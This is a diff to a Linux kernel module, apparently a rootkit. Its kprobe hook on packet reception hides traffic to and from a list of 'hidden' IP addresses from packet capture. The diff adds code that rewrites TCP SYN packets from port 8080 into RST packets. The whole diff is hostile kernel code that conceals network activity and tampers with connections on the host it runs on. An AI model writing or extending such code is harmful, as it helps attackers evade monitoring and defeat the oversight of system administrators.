@@ -7,6 +7,7 @@
 #include <uapi/linux/ip.h>
 #include <uapi/linux/ipv6.h>
 #include <linux/ip.h>
+#include <linux/in.h>
 #include <linux/ipv6.h>
 
 #include "common.h"
@@ -112,6 +113,7 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
 {
     struct sk_buff *skb;
     skb = (struct sk_buff *)pt_regs->di;
+    u8 protocol = 0;
 
     char *data = skb_network_header(skb);
     char ver = data[0];
@@ -125,6 +127,7 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
         struct ipv6hdr *iphdr;
 
         iphdr = ipv6_hdr(clone);
+        protocol = iphdr->nexthdr;
 
         if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v6)
             || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v6))
@@ -133,10 +136,26 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
         struct iphdr *iphdr;
 
         iphdr = ip_hdr(clone);
+        protocol = iphdr->protocol;
 
         if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v4)
             || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
             clone->pkt_type = PACKET_LOOPBACK;
+    }
+
+    // We need to intercept (RST) the TCP handshake
+    if (protocol == IPPROTO_TCP) {
+        struct tcphdr *tcphdr;
+
+        tcphdr = (struct tcphdr *)skb_transport_header(skb);
+        unsigned src_port = (unsigned)ntohs(tcphdr->source);
+
+        if (src_port == 8080) { // list_contains_port(...)
+            if (tcphdr->syn) {
+                tcphdr->syn = 0;
+                tcphdr->rst = 1;
+            }
+        }
     }
 
     return 0;
